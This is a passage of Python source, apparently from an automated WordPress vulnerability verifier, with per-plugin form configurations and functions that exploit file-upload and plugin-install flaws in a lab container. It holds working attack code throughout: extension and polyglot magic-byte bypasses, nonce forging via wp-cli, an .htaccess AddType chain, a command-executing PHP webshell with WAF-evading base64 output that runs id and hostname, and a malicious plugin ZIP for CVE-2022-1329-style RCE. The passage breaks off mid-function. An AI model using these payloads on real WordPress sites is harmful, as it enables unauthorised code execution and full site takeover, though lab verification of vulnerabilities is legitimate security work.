        "nonce_param":    "security",
        "nonce_action":   "scwordform_wpnonce",   # check_ajax_referer('scwordform_wpnonce', 'security')
        "ajax_action":    "sc_wordform_created_form_submission",
        "shortcode_name": "wordform",
        "nopriv":         True,  # add_action('wp_ajax_nopriv_...') → no login required
    },
    "wpforms-lite": {
        "file_field_tpl": "wpforms[fields][{form_id}]",
        "nonce_param":    "wpforms[nonce]",
        "nonce_action":   "wpforms::submit",
        "ajax_action":    "wpforms_submit",
        "shortcode_name": "wpforms",
        "nopriv":         True,
    },
    "wpforms": {
        "file_field_tpl": "wpforms[fields][{form_id}]",
        "nonce_param":    "wpforms[nonce]",
        "nonce_action":   "wpforms::submit",
        "ajax_action":    "wpforms_submit",
        "shortcode_name": "wpforms",
        "nopriv":         True,
    },
    "ninja-forms": {
        "file_field_tpl": "nf_fields[{form_id}][value]",
        "nonce_param":    "_wpnonce",
        "nonce_action":   "nf_ajax_submit",
        "ajax_action":    "nf_ajax_submit",
        "shortcode_name": "ninja_form",
        "nopriv":         True,
    },
    "formidable": {
        "file_field_tpl": "item_meta[{form_id}]",
        "nonce_param":    "frm_submit_entry_nonce",
        "nonce_action":   "frm_submit_entry_nonce",
        "ajax_action":    "frm_entries_create",
        "shortcode_name": "formidable",
        "nopriv":         True,
    },
    "gravityforms": {
        "file_field_tpl": "input_{form_id}_1",
        "nonce_param":    "gform_field_values",
        "nonce_action":   "gform_submit_{form_id}",
        "ajax_action":    "rg_save_progress",
        "shortcode_name": "gravityforms",
        "nopriv":         True,
    },
    "contact-form-7": {
        "file_field_tpl": "file-{form_id}",
        "nonce_param":    "_wpnonce",
        "nonce_action":   "file-{form_id}",
        "ajax_action":    "wpcf7_submit",
        "shortcode_name": "contact-form-7",
        "nopriv":         True,
    },
    "everest-forms": {
        "file_field_tpl": "everest_forms[form_fields][{form_id}]",
        "nonce_param":    "_wpnonce",
        "nonce_action":   "everest_forms_process_submit",
        "ajax_action":    "everest_forms",
        "shortcode_name": "everest_form",
        "nopriv":         True,
    },
}


def verify_wordpress_file_upload(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, file_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
    file_field_tpl: str = "",
    extra_upload_data: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica unrestricted file upload (webshell) en dos pasos, ambos con prueba dura:

    1) sube un fichero PHP disfrazado (varias combinaciones de extension: .php, .php.jpg,
       .phtml, .php5, .pHp, .jpg.php) cuyo CONTENIDO calcula `a+b` para dos numeros aleatorios.
    2) en vez de adivinar la URL publica (WordPress puede renombrar/sanear el nombre), se
       pregunta DIRECTAMENTE al filesystem del contenedor (find_in_webroot) por un fichero cuyo
       nombre contenga el token unico de ese intento, se construye su URL publica real a partir de
       esa ruta, y se pide. Si la respuesta contiene la SUMA calculada (y no el codigo PHP fuente
       sin ejecutar), es prueba de que el fichero subido se EJECUTA como PHP, no solo que se
       guardo -- un servidor que solo almacena el fichero devolveria el codigo fuente literal, que
       no contiene ese numero en ningun punto.

    file_field_tpl: plantilla para el campo del fichero cuando el plugin usa una estructura
        anidada en vez de un campo plano (p.ej. WordForm: 'wordform[{form_id}][upload][0][files]',
        WPForms: 'wpforms[fields][{form_id}]'). {form_id} se resuelve automaticamente raspando
        la pagina del shortcode o via wp-cli. Si vacio, se usa file_param_hint/parameters.

    extra_upload_data: datos POST adicionales que van junto a cada intento de subida. Pueden
        contener {form_id} y {filename} como marcadores. Usados para bypassar validaciones que
        leen la lista de tipos permitidos del POST en vez de de la configuracion del servidor
        (ej. WordForm: 'wordform[{form_id}][upload][0][fileAllowed]'='' → la validacion siempre
        devuelve True porque wp_check_filetype devuelve '' que esta en la allowed_list [''])."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    # Si el slug tiene una configuracion conocida de campo anidado, autoconfigura los parametros
    # que no se hayan pasado explicitamente (el analista siempre tiene prioridad).
    _slug_cfg = _UPLOAD_FORM_PLUGIN_CONFIG.get(slug, {})
    if not file_field_tpl and _slug_cfg.get("file_field_tpl"):
        file_field_tpl = _slug_cfg["file_field_tpl"]
    if extra_upload_data is None and _slug_cfg.get("extra_upload_data"):
        extra_upload_data = dict(_slug_cfg["extra_upload_data"])
    if not shortcode_name and _slug_cfg.get("shortcode_name"):
        shortcode_name = _slug_cfg["shortcode_name"]
    _nonce_param_cfg  = _slug_cfg.get("nonce_param", "")
    _nonce_action_cfg = _slug_cfg.get("nonce_action", "")  # accion real para wp_create_nonce
    _ajax_action_cfg  = _slug_cfg.get("ajax_action", "")   # valor de 'action' para admin-ajax.php
    _nopriv_cfg       = bool(_slug_cfg.get("nopriv", False))  # True → nopriv: sesion anonima + nonce uid=0

    # Nonce param autoconfig: lo añadimos a base_params para que _auto_resolve_wp_blockers
    # lo rellene via scraping/eval. Si luego resolvemos form_id y conocemos la nonce_action
    # exacta, el nonce se sobreescribe con un valor generado directamente via wp-cli.
    _auto_nonce_inject: dict = {}
    if _nonce_param_cfg and not any(_nonce_param_cfg in str(p) for p in (parameters or [])):
        _auto_nonce_inject = {_nonce_param_cfg: ""}
    # Action param autoconfig: admin-ajax.php necesita 'action' en el POST; si no viene de
    # los params del analista ni de la hipotesis del LLM, lo inyectamos del config del plugin.
    _auto_action_inject: dict = {}
    if _ajax_action_cfg:
        _params_flat = " ".join(str(p) for p in (parameters or []))
        if "action" not in _params_flat:
            _auto_action_inject = {"action": _ajax_action_cfg}

    file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
    # Si se usa file_field_tpl, no hace falta file_param: el campo del fichero viene del template.
    _probe_file_params: list = []  # candidatos a probar cuando no hay param conocido
    if not file_param and not file_field_tpl:
        # Fallback 1: escanear el codigo fuente PHP del plugin buscando $_FILES['campo']
        file_param = _scan_php_files_field(plugin_source_dir)
        if file_param:
            step(f"[file-upload] campo detectado desde codigo fuente PHP: '{file_param}'")
    if not file_param and not file_field_tpl:
        # Fallback 2: probe mode — intentaremos en el lab todos los nombres comunes uno a uno.
        # La confirmacion ocurre igual que siempre (grep del secreto dentro del contenedor), asi que
        # no hay falsos positivos — si el secreto aparece, el campo era el correcto.
        _probe_file_params = list(_FILE_UPLOAD_HINTS) + [
            "async-upload", "files[]", "file[]", "attachment[]",
        ]
        file_param = _probe_file_params[0]  # empezamos por el primero; se sobreescribe en el loop
        step(f"[file-upload] campo no detectado — modo probe: probando {len(_probe_file_params)} candidatos")

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        # cada variante ataca un tipo distinto de validacion: extension simple/doble, mayusculas
        # mezcladas (filtros case-sensitive), truco del punto-y-coma de IIS/Apache antiguos, y
        # magic bytes REALES de imagen delante del PHP (bypass de getimagesize()/exif_imagetype(),
        # que solo miran los primeros bytes, no el resto del fichero).
        # payload_kb aporta variantes adicionales de extension y de webshell (<?=, <?, etc.)
        # que se añaden como fallback cuando los estandares no ejecutan.
        try:
            from .payload_kb import load_php_extension_bypasses as _phplk_exts
            _extra_ext_names = [n.replace("poc", "binoracle_{t}") for n in _phplk_exts("poc")]
        except ImportError:
            _extra_ext_names = []
        variants = [
            ("binoracle_{t}.php", b"", "image/jpeg"),
            ("binoracle_{t}.php.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.phtml", b"", "image/jpeg"),
            ("binoracle_{t}.php5", b"", "image/jpeg"),
            ("binoracle_{t}.php7", b"", "image/jpeg"),
            ("binoracle_{t}.php3", b"", "image/jpeg"),
            ("binoracle_{t}.pht", b"", "image/jpeg"),
            ("binoracle_{t}.phar", b"", "application/octet-stream"),
            ("binoracle_{t}.pHp", b"", "image/jpeg"),
            ("binoracle_{t}.jpg.php", b"", "image/jpeg"),
            ("binoracle_{t}.php;.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.jpg", b"GIF89a;", "image/gif"),              # polyglot GIF89a + PHP
            ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),    # polyglot JPEG SOI + PHP
            ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
        ]
        # Añadir extensiones del payload_kb que no estén ya en la lista base
        _existing_ext_patterns = {v[0] for v in variants}
        for _extra_ext in _extra_ext_names:
            # Solo añadir si no está ya representada (formato: "binoracle_{t}.EXT")
            _canonical = _extra_ext.split("{t}")[-1]
            if not any(_canonical in pat for pat in _existing_ext_patterns):
                variants.append((_extra_ext, b"", "image/jpeg"))
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        # Inyectar nonce y action del plugin si se autoconfiguraron y no vienen ya en parameters.
        base_params.update({k: v for k, v in _auto_nonce_inject.items() if k not in base_params})
        base_params.update({k: v for k, v in _auto_action_inject.items() if k not in base_params})
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, file_param or "", res, step,
            extra_nonce_pages=extra_nonce_pages)
        other_params = {k: v for k, v in base_params.items() if k != file_param}

        # When upload field is a *_url param, the companion *_name param carries the filename.
        # Pass it automatically with the actual filename so the server saves the right extension.
        _companion_name_param = ""
        if file_param and any(file_param.endswith(s) for s in _UPLOAD_BINARY_SUFFIXES):
            _prefix = file_param[:file_param.rfind("_")]
            for _np in (_prefix + "_name", _prefix + "_filename", "file_name", "filename"):
                if _np in other_params or _np in (parameters or []):
                    _companion_name_param = _np
                    break

        # ── Resolución de form_id para plugins con campo de subida anidado ───────────────────
        # Cuando file_field_tpl o extra_upload_data contienen {form_id}, lo resolvemos aquí
        # una vez (scrape de la pagina del shortcode → wp-cli CPT → wp eval create).
        _form_id = ""
        _needs_form_id = (
            (file_field_tpl and "{form_id}" in file_field_tpl) or
            any("{form_id}" in str(v) or "{form_id}" in str(k)
                for k, v in (extra_upload_data or {}).items())
        )
        if _needs_form_id:
            _form_id = _resolve_form_id_for_upload(boot, lab, slug, step)
            if not _form_id:
                step("[WARN] form_id no resuelto -- usando '1' como fallback")
                _form_id = "1"

        # ── Override de nonce + sesion para acciones nopriv ──────────────────────────────────
        # _auto_resolve_wp_blockers puede haber capturado un nonce incorrecto (admin bar,
        # WP REST API…). Si conocemos la nonce_action exacta del plugin, generamos el nonce
        # correcto via wp-cli y lo sobreescribimos en base_params/other_params.
        #
        # CLAVE: en WordPress los nonces son session-specific. Para acciones nopriv (cualquier
        # visitante sin cuenta puede explotarlas), el nonce debe generarse para uid=0 (sin sesion)
        # Y el ataque debe enviarse con una sesion ANONIMA (sin la cookie del subscriber) --
        # de lo contrario wp_verify_nonce usaria la sesion del subscriber y el nonce uid=0 fallaria.
        # Para acciones auth (subscriber o superior), no se hace override aqui: el nonce se raspa
        # de las paginas cargadas por la sesion del subscriber, que es correcto.
        _attack_sess = None   # None → usar boot.sub_sess (default); requests.Session → sesion anonima
        if _nonce_action_cfg and _nonce_param_cfg:
            try:
                _nonce_action_real = _nonce_action_cfg.replace("{form_id}", _form_id)
                _r_fn = lab.wp_cli("eval",
                                   f"wp_set_current_user(0); "
                                   f"echo wp_create_nonce('{_nonce_action_real}');",
                                   timeout=10)
                _fresh_nonce = (_r_fn.stdout or "").strip()
                if _fresh_nonce and re.match(r'^[0-9a-f]{8,20}$', _fresh_nonce):
                    _old_nonce = base_params.get(_nonce_param_cfg, "(ninguno)")
                    base_params[_nonce_param_cfg] = _fresh_nonce
                    other_params[_nonce_param_cfg] = _fresh_nonce
                    step(f"nonce '{_nonce_action_real}' generado via wp-cli "
                         f"(sobreescribe nonce incorrecto raspado: "
                         f"{str(_old_nonce)[:8]}…→{_fresh_nonce[:8]}…)")
                    res.evidence["nonce_override_via_wp_cli"] = {
                        "action": _nonce_action_real, "value": _fresh_nonce}
                    if _nopriv_cfg:
                        # Sesion anonima: no lleva cookies → uid=0 → el nonce uid=0 valida
                        import requests as _rq
                        _attack_sess = _rq.Session()
                        _attack_sess.headers["User-Agent"] = "binoracle/lab-anon"
                        step("sesion ANONIMA (sin cookie de subscriber): el ataque es nopriv "
                             "→ no necesita autenticacion, uid=0 en server == uid=0 del nonce")
            except Exception:
                pass

        def _subst(s: str, fname: str = "") -> str:
            return s.replace("{form_id}", _form_id).replace("{filename}", fname)

        # Datos bypass adicionales: se sustituyen los marcadores por cada intento.
        _extra_upload_resolved: dict = {
            _subst(k): _subst(v) if isinstance(v, str) else v
            for k, v in (extra_upload_data or {}).items()
        } if extra_upload_data else {}
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "file_param": file_param, "metodo": m, "endpoint": endpoint,
        })

        found = False
        tried = []
        # Probe mode: when no field was detected at analysis time, iterate over common
        # candidates automatically. Quick single-variant probe per candidate; full set once found.
        _probe_candidates = _probe_file_params if _probe_file_params else [file_param or "file"]
        for _probe_candidate in _probe_candidates:
            if _probe_file_params:
                step(f"[probe] probando campo '{_probe_candidate}'...")
            _actual_file_field = _subst(file_field_tpl) if file_field_tpl else _probe_candidate
            # In probe mode: use just 2 variants per candidate to stay fast; full set once confirmed
            _probe_variants = variants[:2] if _probe_file_params else variants
            for tmpl, magic, content_type in _probe_variants:
                token = _token()
                fname = tmpl.format(t=token)
                a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
                expected = a + b
                # Generar variantes de apertura PHP: primero estandar, luego bypass
                # (<?= short echo, <? short_open_tag) como fallback inline si falla.
                _php_open_variants = [
                    f"<?php echo {a}+{b}; ?>",        # estandar (PHP 4+)
                    f"<?= {a}+{b}; ?>",                # short echo tag (PHP 5.4+)
                    f"<? echo {a}+{b}; ?>",            # short_open_tag (PHP <= 7.x)
                    f"<script language=php> echo {a}+{b}; </script>",  # PHP < 7.0
                ]
                # Usar la variante estandar por defecto; el loop exterior intentará
                # las variantes de bypass si esta no produce ejecucion
                php_payload = magic + _php_open_variants[0].encode()
                step(f"subiendo '{fname}' via campo '{_actual_file_field}' "
                     f"(magic bytes={magic!r}, contenido PHP que calcula {a}+{b})...")
                # extra_upload_data puede tener {filename}: sustituir por el nombre real del intento
                _extra_per_attempt = {
                    _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
                    for k, v in _extra_upload_resolved.items()
                }
                _sess_to_use = _attack_sess if _attack_sess is not None else boot.sub_sess
                # If companion name param found (e.g. file_name), inject fname into form data
                _name_inject = {_companion_name_param: fname} if _companion_name_param else {}
                try:
                    resp = _sess_to_use.request(
                        m, boot.base_url + endpoint,
                        data={**other_params, **_extra_per_attempt, **_name_inject},
                        files={_actual_file_field: (fname, php_payload, content_type)}, timeout=20)
                except Exception as e:
                    tried.append({"filename": fname, "error_subida": str(e)})
                    continue
                found_path = lab.find_in_webroot(token)
                _resp_snippet = (resp.text or "")[:200].replace("\n", " ").strip()
                entry = {"filename": fname, "status_subida": resp.status_code,
                        "encontrado_en_contenedor": found_path,
                        "file_field_usado": _actual_file_field,
                        "respuesta_servidor": _resp_snippet}
                if not found_path:
                    # Many plugins return {"url": "..."} or {"data": {"url": ...}} in the
                    # upload response. Try that URL directly before giving up — the file may
                    # live outside /var/www/html or be accessible only via the returned link.
                    _url_from_resp = None
                    try:
                        import json as _jmod
                        _rj = _jmod.loads(resp.text or "{}")
                        for _rk in ("url", "file", "src", "path", "location", "file_url", "fileUrl"):
                            _rv = _rj.get(_rk)
                            if not _rv and isinstance(_rj.get("data"), dict):
                                _rv = _rj["data"].get(_rk)
                            if _rv and isinstance(_rv, str) and _rv.startswith("http"):
                                _url_from_resp = _rv
                                break
                    except Exception:
                        pass
                    if _url_from_resp:
                        step(f"  fichero no en webroot; probando URL de la respuesta: {_url_from_resp!r}")
                        try:
                            import requests as _rq2
                            r2 = _rq2.get(_url_from_resp, timeout=15)
                            _pat2 = re.compile(rf"(?<!\d){expected}(?!\d)")
                            if _pat2.search(r2.text or ""):
                                found = True
                                entry.update({"url_publica": _url_from_resp,
                                              "suma_presente": True, "status_peticion_directa": r2.status_code})
                                res.evidence.update({
                                    "filename_ganador": fname, "url_publica_ganadora": _url_from_resp,
                                    "status_code_respuesta": r2.status_code,
                                    "respuesta_cuerpo_recorte": (r2.text or "")[:500],
                                })
                                step(f"VERIFICADO (URL de respuesta): {_url_from_resp} devolvio "
                                     f"{expected} (={a}+{b}) — el fichero se EJECUTA como PHP.")
                                tried.append(entry)
                                break
                        except Exception:
                            pass
                    if not found:
                        if _resp_snippet:
                            step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
                        tried.append(entry)
                        continue
                    if found:
                        break
                rel = found_path.replace("/var/www/html", "", 1) if found_path else ""
                candidate_url = boot.base_url + rel if rel else ""
                if not candidate_url:
                    continue
                entry["url_publica"] = candidate_url
                step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
                try:
                    import requests as _requests
                    r2 = _requests.get(candidate_url, timeout=15)
                except Exception as e:
                    entry["error_peticion_directa"] = str(e)
                    tried.append(entry)
                    continue
                pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
                executed = bool(pattern.search(r2.text or ""))
                entry["status_peticion_directa"] = r2.status_code
                entry["suma_esperada"] = expected
                entry["suma_presente"] = executed
                # Fallback: si el fichero se guardo pero no ejecuto, intentar con
                # las variantes de apertura PHP alternativas (<?=, <?, <script language=php>)
                # Esto cubre servidores donde <?php esta bloqueado/deshabilitado pero
                # short_open_tag=On o tienen PHP < 7.0.
                if not executed and found_path and candidate_url:
                    for _php_alt in _php_open_variants[1:]:  # saltar el primero (ya probado)
                        _fname_alt = fname  # mismo nombre, solo cambia el contenido
                        _py_alt_payload = magic + _php_alt.encode()
                        try:
                            import requests as _rq_alt
                            _rq_alt.post(boot.base_url + endpoint,
                                         data={**other_params, **_extra_per_attempt},
                                         files={_actual_file_field: (
                                             _fname_alt, _py_alt_payload, content_type)},
                                         timeout=20)
                            _r_alt = _rq_alt.get(candidate_url, timeout=10)
                            if pattern.search(_r_alt.text or ""):
                                executed = True
                                entry["php_open_bypass"] = _php_alt[:30]
                                step(f"WEBSHELL BYPASS: '{_php_alt[:20]}' ejecuto donde '<?php' no "
                                     f"ejecutaba -- '{fname}' en {candidate_url}")
                                break
                        except Exception:
                            continue
                tried.append(entry)
                if executed:
                    found = True
                    if _probe_file_params:
                        step(f"[probe] campo correcto encontrado: '{_probe_candidate}'")
                        res.evidence["file_param"] = _probe_candidate
                    res.evidence["filename_ganador"] = fname
                    res.evidence["url_publica_ganadora"] = candidate_url
                    res.evidence["status_code_respuesta"] = r2.status_code
                    res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
                    step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
                         f"subido se EJECUTA como PHP, no se sirve como archivo estatico.")
                    # Captura HTTP del webshell ejecutándose
                    _capture_exploit_shot(
                        boot, "GET", rel, r2, highlight=str(expected),
                        caption_es=(f"Paso 5 (CLAVE): FILE UPLOAD CONFIRMADO — '{fname}' "
                                    f"ejecuta como PHP y devuelve {expected} (={a}+{b}). "
                                    f"URL publica: {candidate_url}"),
                        caption_en=(f"Step 5 (KEY): FILE UPLOAD CONFIRMED — '{fname}' "
                                    f"executes as PHP returning {expected} (={a}+{b}). "
                                    f"Public URL: {candidate_url}"))
                    boot.capture(boot.sub_sess, rel,
                           f"Paso 5b: FILE UPLOAD (navegador) — webshell ejecuta {expected}={a}+{b}.",
                           f"Step 5b: FILE UPLOAD (browser) — webshell executes {expected}={a}+{b}.")
                    # Post-execution: upload a real webshell and run id/uname via HTTP
                    try:
                        _ws_token = _token()
                        _ws_fname = f"binoracle_{_ws_token}.php"
                        # PHP webshell: echo marker + system(cmd) + base64-encode to avoid WAF
                        _ws_php = (
                            b"<?php if(isset($_GET['_cmd'])){"
                            b"echo 'WS_OUT:'.base64_encode(shell_exec($_GET['_cmd'])).'WS_END';"
                            b"}else{echo 'WS:1';}?>"
                        )
                        _ws_extra = {
                            _subst(k, _ws_fname): _subst(v, _ws_fname)
                            if isinstance(v, str) else v
                            for k, v in _extra_upload_resolved.items()
                        }
                        _sess_to_use.request(
                            m, boot.base_url + endpoint,
                            data={**other_params, **_ws_extra},
                            files={_actual_file_field: (_ws_fname, _ws_php, "application/x-php")},
                            timeout=20)
                        _ws_path = lab.find_in_webroot(_ws_token)
                        if _ws_path:
                            _ws_rel = _ws_path.replace("/var/www/html", "", 1)
                            _ws_url = boot.base_url + _ws_rel
                            import requests as _rqs2
                            _id_r = _rqs2.get(_ws_url + "?_cmd=id", timeout=8)
                            _uname_r = _rqs2.get(_ws_url + "?_cmd=hostname", timeout=8)
                            _id_body = _id_r.text or ""
                            _uname_body = _uname_r.text or ""
                            import base64 as _b64
                            def _decode_ws(raw: str) -> str:
                                m2 = re.search(r"WS_OUT:([A-Za-z0-9+/=]+)WS_END", raw)
                                if m2:
                                    try:
                                        return _b64.b64decode(m2.group(1)).decode("utf-8", errors="replace").strip()
                                    except Exception:
                                        return ""
                                return ""
                            _id_out = _decode_ws(_id_body)
                            _host_out = _decode_ws(_uname_body)
                            if _id_out or _host_out:
                                res.evidence["webshell_exec"] = {
                                    "url": _ws_url,
                                    "id_output": _id_out,
                                    "hostname": _host_out,
                                }
                                step(f"webshell POST-EXEC: id={_id_out!r}, hostname={_host_out!r}")
                    except Exception:
                        pass
                    break
            if found:
                break
        res.evidence["intentos"] = tried

        # ultimo recurso: la cadena clasica del .htaccess de Apache. Si ninguna extension/magic
        # byte colo, se intenta subir un .htaccess que reinterprete .jpg como PHP (AddType), y
        # LUEGO una imagen con el payload -- dos peticiones encadenadas en vez de una sola, pero
        # con la misma prueba dura (la suma calculada) al final.
        htaccess_evidence = None
        if not found:
            step("ninguna variante directa funciono; probando la cadena .htaccess (AddType) + "
                 "imagen con el payload...")
            htaccess_body = b"AddType application/x-httpd-php .jpg\n"
            _ht_extra = {
                _subst(k, ".htaccess"): _subst(v, ".htaccess") if isinstance(v, str) else v
                for k, v in _extra_upload_resolved.items()
            }
            try:
                r_ht = _sess_to_use.request(
                    m, boot.base_url + endpoint, data={**other_params, **_ht_extra},
                    files={_actual_file_field: (".htaccess", htaccess_body, "text/plain")},
                    timeout=20)
                htaccess_evidence = {"status_subida_htaccess": r_ht.status_code}
            except Exception as e:
                htaccess_evidence = {"error_subida_htaccess": str(e)}
            if htaccess_evidence.get("status_subida_htaccess") is not None:
                token = _token()
                fname = f"binoracle_{token}.jpg"
                a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
                expected = a + b
                php_payload = f"<?php echo {a}+{b}; ?>".encode()
                step(f"subiendo '{fname}' tras el .htaccess (deberia ejecutarse como PHP si el "
                     f".htaccess se respeto)...")
                _ht_jpg_extra = {
                    _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
                    for k, v in _extra_upload_resolved.items()
                }
                try:
                    resp = _sess_to_use.request(
                        m, boot.base_url + endpoint, data={**other_params, **_ht_jpg_extra},
                        files={_actual_file_field: (fname, php_payload, "image/jpeg")},
                        timeout=20)
                    found_path = lab.find_in_webroot(token)
                    if found_path:
                        rel = found_path.replace("/var/www/html", "", 1)
                        candidate_url = boot.base_url + rel
                        import requests as _requests
                        r2 = _requests.get(candidate_url, timeout=15)
                        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
                        executed = bool(pattern.search(r2.text or ""))
                        htaccess_evidence.update({"filename": fname, "url_publica": candidate_url,
                                                  "suma_esperada": expected, "suma_presente": executed})
                        if executed:
                            found = True
                            res.evidence["tecnica"] = "htaccess-chain"
                            res.evidence["filename_ganador"] = fname
                            res.evidence["url_publica_ganadora"] = candidate_url
                            res.evidence["status_code_respuesta"] = r2.status_code
                            res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
                            step(f"VERIFICADO (cadena .htaccess): {candidate_url} devolvio "
                                 f"{expected} (={a}+{b}) -- el .htaccess subido reinterpreto "
                                 f".jpg como PHP de verdad.")
                except Exception as e:
                    htaccess_evidence["error_segunda_subida"] = str(e)
            res.evidence["htaccess_intento"] = htaccess_evidence

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "htaccess-chain":
                res.detail = (f"FILE UPLOAD confirmado (cadena .htaccess): se subio un .htaccess "
                              f"que reinterpreta .jpg como PHP, y luego '"
                              f"{res.evidence['filename_ganador']}' se EJECUTO como tal -- el "
                              f"endpoint acepta subir .htaccess arbitrario, cadena clasica de "
                              f"escalada a RCE")
            else:
                res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se "
                              f"subio via {file_param} y, al pedirlo en "
                              f"{res.evidence['url_publica_ganadora']}, el servidor lo EJECUTO "
                              f"como PHP (devolvio una suma calculada por el interprete, no el "
                              f"codigo fuente) -- prueba inequivoca de webshell, no solo de que "
                              f"la subida fue aceptada")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension/magic-bytes y "
                          f"la cadena .htaccess, y ninguna produjo un fichero que se ejecutara "
                          f"como PHP -- el file-upload no se confirmo (puede que valide de "
                          f"verdad la extension/el tipo MIME/el contenido, o el campo/endpoint no "
                          f"sean los reales)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def _build_minimal_plugin_zip(token: str, expected_sum_a: int, expected_sum_b: int) -> bytes:
    """Construye, EN MEMORIA, un ZIP de plugin de WordPress minimo pero valido: una carpeta
    <slug>/ con un unico fichero <slug>.php que lleva la cabecera de plugin que WordPress exige
    para reconocerlo como tal (comentario '/* Plugin Name: ... */' al principio del fichero
    principal, mismo nombre que la carpeta) y, como cuerpo, un calculo de suma -- la misma prueba
    dura que verify_wordpress_file_upload: si la respuesta trae la suma CALCULADA y no el codigo
    fuente, es que el intérprete PHP lo ejecuto de verdad, no que el ZIP solo se desempaqueto."""
    slug = f"binoracle_shell_{token}"
    php = (
        f"<?php\n"
        f"/*\n"
        f"Plugin Name: binoracle test {token}\n"
        f"Description: minimal plugin used only to prove Plugin_Upgrader->install() RCE\n"
        f"Version: 1.0\n"
        f"*/\n"
        f"echo {expected_sum_a}+{expected_sum_b};\n"
    ).encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{slug}/{slug}.php", php)
    return buf.getvalue()


def verify_wordpress_plugin_install_rce(
    plugin_source_dir: str, slug: str, ajax_action: str,
    file_param_hint: str = "fileToUpload", nonce_param_hint: str = "_nonce",
    extra_params: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica el patron de RCE 'instalacion de plugin via AJAX' -- distinto del upload directo
    que verify_wordpress_file_upload cubre (un .php/.phtml/polyglot subido directamente al
    webroot): aqui el sumidero real es WordPress_Upgrader/Plugin_Upgrader->install(), que ESPERA
    un ZIP de plugin valido (no un .php suelto) y lo desempaqueta bajo wp-content/plugins/<slug>/.
    Patron confirmado en vivo contra CVE-2022-1329 (Elementor <=3.6.2, core/app/modules/onboarding/
    module.php): un handler AJAX registrado en admin_init que solo comprueba el nonce
    (wp_verify_nonce) sin ningun chequeo de capability, asi que cualquier usuario autenticado de
    bajo privilegio (Subscriber) puede llamarlo -- este verificador generaliza ese patron a
    cualquier plugin/handler con la misma forma (accion AJAX + nonce + campo de fichero que acaba
    en Plugin_Upgrader/unzip_file), no solo Elementor.

    Dos pasos, cada uno con prueba dura:
    1) construye un ZIP de plugin minimo real (ver _build_minimal_plugin_zip) cuyo PHP calcula
       a+b, y lo sube via POST multipart a /wp-admin/admin-ajax.php con action=`ajax_action` y el
       nonce resuelto de verdad (scraping de paginas reales del sitio via _auto_resolve_wp_blockers
       -- el mismo mecanismo generalizado a los 13 verificadores, aqui aplicado al nonce de un
       endpoint AJAX en vez de a un formulario).
    2) en vez de adivinar la ruta publica del plugin instalado, pregunta DIRECTAMENTE al
       filesystem del contenedor (find_in_webroot con base_dir='wp-content/plugins') por un
       fichero cuyo nombre contenga el token unico de este intento, construye su URL publica real,
       y la pide: si la respuesta trae la suma CALCULADA (no el codigo fuente), el ZIP se
       instalo Y el PHP dentro se ejecuta -- RCE confirmada, no solo 'el ZIP se acepto'."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        endpoint = "/wp-admin/admin-ajax.php"
        base_params = {"action": ajax_action, nonce_param_hint: ""}
        base_params.update(extra_params or {})
        endpoint, base_params = _auto_resolve_wp_blockers(
